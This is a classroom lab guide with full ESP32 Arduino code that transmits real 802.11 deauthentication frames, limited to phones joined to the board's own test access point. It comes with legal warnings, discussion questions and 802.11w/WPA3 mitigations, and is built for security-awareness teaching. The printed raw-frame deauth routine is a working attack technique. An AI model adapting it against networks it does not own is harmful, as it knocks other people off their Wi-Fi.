# "The Deauth Storm" — Watching a Real Attack (Against Itself)
### (ESP32 DevKit V1 only — pairs with Lab 2, the Deauth Canary)

In [The Deauth Canary](02-deauth-canary-wifi-smoke-alarm-en.md), students built a detector for deauthentication attacks without ever sending one. This project completes the picture: it transmits **real 802.11 deauthentication frames** — the exact same attack the Canary listens for — but deliberately hard-limited so the ESP32 can only ever attack **its own disposable test access point**, never a real network. Watch a volunteer's phone get forcibly kicked off Wi-Fi every few seconds, then bring a Lab 2 Canary board nearby and watch it catch the exact same burst live.

> **This is the one lab in this set that transmits real attack traffic.** It is hard-coded to target only MAC addresses connected to its own throwaway `Deauth_Test_Target` access point — an AP this same board creates and that grants no internet access, the same pattern as the Evil Twin lab. There is no field to type another network's BSSID into. Do not modify this code to target a network you do not personally own and control; deliberately deauthenticating someone else's Wi-Fi is a federal crime in the US (Computer Fraud and Abuse Act) and illegal under equivalent computer-misuse laws elsewhere, whether or not it causes visible harm.

---

## ⚠️ Read This First: Ethical and Legal Framework

- **Self-target only, by design:** the code reads its own AP's connected-client list at runtime and only ever builds deauth frames from its own AP's BSSID plus those exact client MACs. It cannot be pointed at a third-party network without rewriting the targeting logic — don't rewrite it.
- **Never repoint this at production Wi-Fi:** not the school's network, not a café's, not a neighbor's. "Just testing for a second" is still unauthorized interference with a computer network in most jurisdictions.
- **Consent for the volunteer:** whoever's phone joins the test AP should know in advance that it will be repeatedly, deliberately disconnected.
- **The goal is awareness:** "The 'attack' is nothing but frames with no signature and no encryption — which is exactly why Protected Management Frames (802.11w) exist."

---

## 1. Required Materials

- ESP32 DevKit V1 (the "attacker" board)
- Micro-USB data cable
- Arduino IDE with ESP32 board package
- *Optional but recommended:* a second ESP32 DevKit V1 flashed with the [Deauth Canary](02-deauth-canary-wifi-smoke-alarm-en.md) code, so students see the attack and the detection side by side

Uses: `WiFi.h`, `esp_wifi.h`

---

## 2. How It Works (Conceptual Overview)

1. The ESP32 opens its own open test AP, `Deauth_Test_Target` — identical pattern to the Evil Twin lab, no internet ever granted
2. A phone joins it out of curiosity or instruction
3. Every few seconds, the ESP32 looks up **its own AP's connected-client list** and builds a real 802.11 deauthentication frame addressed to each client, transmitting it with `esp_wifi_80211_tx()` — the same low-level raw-frame API real deauth tools use
4. The targeted phone is knocked off `Deauth_Test_Target` and, because it's just a disposable test network, tries to reconnect — only to be kicked again on the next burst
5. If a Lab 2 Canary is running nearby, it fires its alarm the moment each burst goes out

---

## 3. Full Code

```cpp
// deauth_storm_self_target.ino
// Sends REAL 802.11 deauthentication frames — but ONLY at clients connected
// to this ESP32's own throwaway test AP. Pairs with the Deauth Canary (lab 02).
// Classroom awareness demo — consent required, self-owned test AP only.
// Do not repoint this at a network you do not own; see the guide's ethics section.

#include <WiFi.h>
#include "esp_wifi.h"
#include <string.h>

const char* ap_ssid = "Deauth_Test_Target"; // this board's own disposable test AP

uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,               // mgmt frame, subtype 12 (deauthentication)
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // destination -> filled per client, at runtime
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // source -> filled with THIS AP's own MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID  -> filled with THIS AP's own MAC
  0x00, 0x00,                           // sequence/fragment number
  0x07, 0x00                            // reason code 7: class 3 frame from nonassociated STA
};

unsigned long lastBurst = 0;
const unsigned long BURST_EVERY_MS = 6000;

void sendDeauthTo(const uint8_t* clientMac, const uint8_t* apMac) {
  memcpy(&deauthFrame[4], clientMac, 6);
  memcpy(&deauthFrame[10], apMac, 6);
  memcpy(&deauthFrame[16], apMac, 6);
  for (int i = 0; i < 6; i++) {           // a short burst, not a continuous flood
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    delay(10);
  }
}

void setup() {
  Serial.begin(115200);
  delay(300);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid); // open network, no internet — same pattern as the Evil Twin lab

  uint8_t apMac[6];
  esp_wifi_get_mac(WIFI_IF_AP, apMac);
  Serial.printf("\n=== Deauth Storm armed on \"%s\" ===\n", ap_ssid);
  Serial.println("Connect a phone to this AP, then watch it get kicked every few seconds.");
  Serial.println("This ONLY targets devices connected to THIS test AP — nothing else.\n");
}

void loop() {
  if (millis() - lastBurst < BURST_EVERY_MS) return;
  lastBurst = millis();

  uint8_t apMac[6];
  esp_wifi_get_mac(WIFI_IF_AP, apMac);

  wifi_sta_list_t stationList;
  esp_wifi_ap_get_sta_list(&stationList);

  if (stationList.num == 0) {
    Serial.println("(no phone connected yet — join the test AP to see the kick)");
    return;
  }

  for (int i = 0; i < stationList.num; i++) {
    uint8_t* m = stationList.sta[i].mac;
    Serial.printf(">>> Sending deauth burst to %02X:%02X:%02X:%02X:%02X:%02X (our own test AP client)\n",
                  m[0], m[1], m[2], m[3], m[4], m[5]);
    sendDeauthTo(m, apMac);
  }
}
```

---

## 4. Setup and Test Steps

1. Upload the code to the "attacker" board and open the Serial Monitor at 115200 baud
2. Connect a volunteer's phone to `Deauth_Test_Target` (open network, no password)
3. Within `BURST_EVERY_MS` (6 seconds by default), watch the phone get kicked offline; the Serial Monitor logs each burst with the client's MAC
4. *Optional:* flash a second ESP32 with the Lab 2 Deauth Canary code and power it up nearby — watch its LED alarm fire in sync with each burst
5. Try changing `BURST_EVERY_MS` and discuss how relentless vs. occasional disruption feels different

> If you don't have a second board for the Canary, run the two sketches on the same board on separate days — the Canary's alarm logic and this attack's frame structure are directly comparable side by side in code.

---

## 5. Classroom Discussion Activity

- "The phone kept reconnecting and kept getting kicked — what would this feel like if it happened to your real home Wi-Fi, indefinitely?"
- "There was no password to guess and no encryption to break — just an unsigned management frame. What does that say about trust in the Wi-Fi standards this replaces?"
- "The Canary caught this instantly. Why doesn't every router do that automatically?"
- "What's the real legal difference between running this against your own test AP versus a stranger's router — even if the effect looks identical?"

---

## 6. Defense / Awareness Takeaways

| Risk | Mitigation |
|---|---|
| Deauth frames aren't authenticated | Use WPA3, or WPA2 with 802.11w (Protected Management Frames) enabled |
| Repeated forced disconnects | Treat sudden, repeated drops as a red flag — not just "bad Wi-Fi" |
| Anyone in radio range can send these | Physical proximity is enough; no login or network access is required to attack |
| Most routers alert on nothing | Detection tooling (like the Lab 2 Canary) fills a gap most consumer routers leave open |

---

## 7. Common Issues

| Issue | Fix |
|---|---|
| Phone never gets kicked | Confirm it actually joined `Deauth_Test_Target`, not another network; check the Serial log shows its MAC each burst |
| Compile error on `esp_wifi_80211_tx` | Confirm `esp_wifi.h` is included and the ESP32 board package is up to date |
| Canary doesn't fire | Make sure the Canary is on the same channel as this AP, or let it finish a channel-hop cycle |
| Phone stays disconnected and won't rejoin | Normal near the end of a burst — wait for its next automatic reconnect attempt |

---

## 8. Student Checklist

- [ ] Explained why this lab only ever targets its own test AP, never a real network
- [ ] Watched a phone get repeatedly kicked from `Deauth_Test_Target`
- [ ] Paired it with a Lab 2 Canary and watched the alarm fire in sync
- [ ] Explained why deauth frames work with no password or encryption involved
- [ ] Named the real-world fix (802.11w / WPA3) and one legal consequence of misusing this technique
